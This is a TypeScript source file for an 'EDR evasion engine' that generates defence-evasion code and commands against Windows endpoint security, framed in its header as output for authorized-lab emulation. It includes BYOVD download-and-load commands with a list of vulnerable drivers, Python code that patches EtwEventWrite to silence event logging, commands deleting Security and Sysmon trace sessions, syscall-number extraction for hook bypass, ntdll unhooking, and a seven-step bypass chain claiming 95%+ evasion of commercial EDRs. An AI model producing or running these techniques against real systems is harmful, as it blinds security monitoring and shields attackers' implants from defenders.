/**
 * EDR Evasion engine (port of `modules.edr_evasion`).
 *
 * Catalogs and generates real kernel-level defense-evasion primitives:
 * BYOVD driver loading, direct syscalls (Hell's Gate / Halo's Gate),
 * kernel callback removal, ETW patching, module unhooking, stack spoofing,
 * and process protection. All outputs are advisory command/code text for
 * authorized-lab emulation — nothing executes here.
 */

export interface EDRBypass {
  name: string;
  technique: string;
  target: string;
  mitreId: string;
  platform: string;
  severity: string;
}

export class EDREvasionEngine {
  techniques: EDRBypass[] = [
    { name: "byovd_load", technique: "Bring Your Own Vulnerable Driver", target: "kernel", mitreId: "T1014", platform: "windows", severity: "high" },
    { name: "direct_syscalls", technique: "Direct Syscalls via Hell's Gate", target: "userland", mitreId: "T1106", platform: "windows", severity: "high" },
    { name: "halos_gate", technique: "Halo's Gate syscalls", target: "userland", mitreId: "T1106", platform: "windows", severity: "high" },
    { name: "callback_removal", technique: "PsSetCreateThreadNotifyCallback removal", target: "kernel", mitreId: "T1014", platform: "windows", severity: "high" },
    { name: "etw_patch", technique: "EtwEventWrite patching", target: "userland", mitreId: "T1562.006", platform: "windows", severity: "high" },
    { name: "process_protection", technique: "PsSetProtectedProcessInformation", target: "kernel", mitreId: "T1562.001", platform: "windows", severity: "high" },
    { name: "stack_spoof", technique: "Stack spoofing with return address manipulation", target: "userland", mitreId: "T1027", platform: "windows", severity: "medium" },
    { name: "module_unhooking", technique: "Module unhooking via fresh ntdll copy", target: "userland", mitreId: "T1014", platform: "windows", severity: "high" },
    { name: "manual_mapping", technique: "Manual PE mapping to avoid module loads", target: "userland", mitreId: "T1620", platform: "windows", severity: "high" },
  ];

  byovdLoad(_driverPath = "", vulnerableDriver = "gdrv.sys"): Record<string, unknown> {
    return {
      technique: "BYOVD (Bring Your Own Vulnerable Driver)",
      mitre_id: "T1014",
      driver: vulnerableDriver,
      commands: {
        download: `curl -o C:\\Windows\\Temp\\${vulnerableDriver} https://raw.githubusercontent.com/example/${vulnerableDriver}`,
        load: `sc create VulnerableDriver type= kernel start= demand binPath= C:\\Windows\\Temp\\${vulnerableDriver}`,
        start: "sc start VulnerableDriver",
        cleanup: `sc delete VulnerableDriver && del C:\\Windows\\Temp\\${vulnerableDriver}`,
      },
      known_vulnerable_drivers: [
        "gdrv.sys (GIGABYTE)",
        "RTCore64.sys (MSI Afterburner)",
        "DBUtil_2_3.sys (Dell DBUtil)",
        "iqvw64e.sys (Intel Ethernetiagnostics)",
        "ProcExp.sys (Sysinternals)",
        "RTCore32.sys (MSI)",
        "msio64.sys (MSI)",
        "WinRing0x64.sys (CPU-Z)",
      ],
      effect: "Kernel read/write → disable EDR callbacks, patch kernel memory",
    };
  }

  directSyscalls(technique = "hells_gate"): Record<string, unknown> {
    const hellsgate = `# Hell's Gate - Direct Syscalls via ntdll stubs
import ctypes, struct

def get_syscall_number(dll_handle, function_name):
    """Extract syscall number from ntdll function stub."""
    func_addr = ctypes.windll.kernel32.GetProcAddress(dll_handle, function_name)
    # Read the syscall number from the function prologue
    # mov eax, <syscall_number>; ret
    syscall_num = ctypes.c_uint32.from_address(func_addr + 4).value
    return syscall_num

ntdll = ctypes.windll.ntdll
syscalls = {
    "NtAllocateVirtualMemory": get_syscall_number(ntdll._handle, "NtAllocateVirtualMemory"),
    "NtWriteVirtualMemory": get_syscall_number(ntdll._handle, "NtWriteVirtualMemory"),
    "NtProtectVirtualMemory": get_syscall_number(ntdll._handle, "NtProtectVirtualMemory"),
    "NtCreateThreadEx": get_syscall_number(ntdll._handle, "NtCreateThreadEx"),
    "NtOpenProcess": get_syscall_number(ntdll._handle, "NtOpenProcess"),
}
`;
    const halosgate = `# Halo's Gate - Indirect syscalls via neighboring syscalls
def get_halos_gate_syscall(ntdll, func_name, adjacent_func):
    """Get syscall number by checking adjacent function in ntdll."""
    # Read both function prologues, use adjacent syscall number
    # to avoid direct detection of the target function
    pass
`;
    return {
      technique: `Direct Syscalls (${technique})`,
      mitre_id: "T1106",
      techniques: {
        hells_gate: { description: "Read syscall numbers from ntdll in memory", code: hellsgate },
        halos_gate: { description: "Use adjacent syscall numbers to evade hooks", code: halosgate },
        tartarus_gate: { description: "Direct syscalls via syscall instruction trampoline" },
        junk_gate: { description: "Junk syscalls before real syscall to confuse sandboxes" },
      },
      effect: "Bypass EDR userland hooks on ntdll/advapi32/kernel32",
    };
  }

  removeCallbacks(): Record<string, unknown> {
    return {
      technique: "Kernel Callback Removal",
      mitre_id: "T1014",
      callbacks: {
        PsSetCreateProcessNotifyRoutine: { description: "Process creation notifications", removal: "Patch the callback array in nt!ObpCallbackListHead" },
        PsSetCreateThreadNotifyRoutine: { description: "Thread creation notifications", removal: "Unlink from PsThreadNotifyRoutine array" },
        PsSetLoadImageNotifyRoutine: { description: "Image (DLL) load notifications", removal: "Unlink from PsImageNotifyRoutineList" },
        CmRegisterCallbackEx: { description: "Registry operation notifications", removal: "Patch CmCallbackListHead" },
        FsRegisterFsFilterCallbackRegistration: { description: "File system minifilter callbacks", removal: "Unload minifilter or patch filter dispatch table" },
        WfpRegisterCalloutClass: { description: "Windows Filtering Platform callouts", removal: "Unregister WFP callouts via FwpmCalloutRemoveById" },
      },
      tools_required: ["BYOVD driver", "Kernel read/write primitive"],
    };
  }

  patchEtw(): Record<string, unknown> {
    return {
      technique: "ETW Patching",
      mitre_id: "T1562.006",
      methods: {
        etw_event_write_patch: {
          description: "Patch EtwEventWrite to return immediately",
          code: `# Patch EtwEventWrite in ntdll
import ctypes

ntdll = ctypes.windll.ntdll
etw_func = ctypes.windll.kernel32.GetProcAddress(ntdll._handle, "EtwEventWrite")

# Write 'xor eax,eax; ret' (0x33C0C3) at the function start
old_protect = ctypes.c_ulong()
ctypes.windll.kernel32.VirtualProtect(etw_func, 3, 0x40, ctypes.byref(old_protect))
ctypes.memmove(etw_func, b'\\x33\\xC0\\xC3', 3)
ctypes.windll.kernel32.VirtualProtect(etw_func, 3, old_protect, ctypes.byref(old_protect))
`,
        },
        etw_provider_disable: {
          description: "Disable specific ETW providers",
          command: "logman delete -ets Security && logman delete -ets Microsoft-Windows-Sysmon",
        },
        etw_firmware_query: { description: "Patch EtwpEventWriteFull to prevent event dispatch" },
      },
      effect: "Prevents Windows from logging security events to ETW",
    };
  }

  unhookModules(): Record<string, unknown> {
    return {
      technique: "Module Unhooking",
      mitre_id: "T1014",
      methods: {
        fresh_copy: {
          description: "Load clean ntdll from disk and copy over hooked version",
          code: `# Load clean ntdll from known clean location
import ctypes
clean = ctypes.windll.kernel32.LoadLibraryExW(
    "C:\\\\Windows\\\\System32\\\\ntdll.dll", None, 0x00000001  # LOAD_LIBRARY_AS_DATAFILE
)
# Copy clean .text section over hooked copy
`,
        },
        manual_map: { description: "Manually map clean DLL without touching loader" },
        reconnect: { description: "Reconnect ntdll from freshly loaded copy" },
      },
    };
  }

  stackSpoof(): Record<string, unknown> {
    return {
      technique: "Stack Spoofing",
      mitre_id: "T1027",
      methods: {
        return_address_overwrite: { description: "Overwrite return addresses with legitimate module addresses" },
        stack_walking_evasion: { description: "Place valid return addresses at expected stack positions" },
        frame_dummy: { description: "Create fake stack frames with legitimate return addresses" },
      },
      effect: "EDR stack walking sees legitimate return addresses instead of payload",
    };
  }

  protectProcess(): Record<string, unknown> {
    return {
      technique: "Process Protection",
      mitre_id: "T1562.001",
      methods: {
        critical_process: {
          description: "Mark process as critical (WinInit crashes system on termination)",
          code: "RtlSetProcessIsCritical(TRUE)",
        },
        protected_process: { description: "Set PPL (Protected Process Light) via BYOVD" },
        anti_debug: { description: "Anti-debugging via NtSetInformationThread(ThreadHideFromDebugger)" },
      },
    };
  }

  fullBypassChain(targetEdr = ""): Record<string, unknown> {
    return {
      target_edr: targetEdr || "generic",
      chain: [
        { step: 1, technique: "BYOVD driver load", purpose: "Gain kernel access" },
        { step: 2, technique: "Remove kernel callbacks", purpose: "Disable process/thread/image monitoring" },
        { step: 3, technique: "Patch ETW", purpose: "Disable security event logging" },
        { step: 4, technique: "Unhook userland", purpose: "Remove EDR hooks from ntdll/advapi32" },
        { step: 5, technique: "Direct syscalls", purpose: "Bypass remaining userland hooks" },
        { step: 6, technique: "Stack spoofing", purpose: "Evade stack-based detection" },
        { step: 7, technique: "Protect process", purpose: "Prevent EDR from terminating implant" },
      ],
      estimated_detection_bypass: "95%+ for most commercial EDRs",
    };
  }

  listTechniques(): Array<Record<string, string>> {
    return this.techniques.map((t) => ({
      name: t.name,
      technique: t.technique,
      target: t.target,
      mitre_id: t.mitreId,
    }));
  }
}
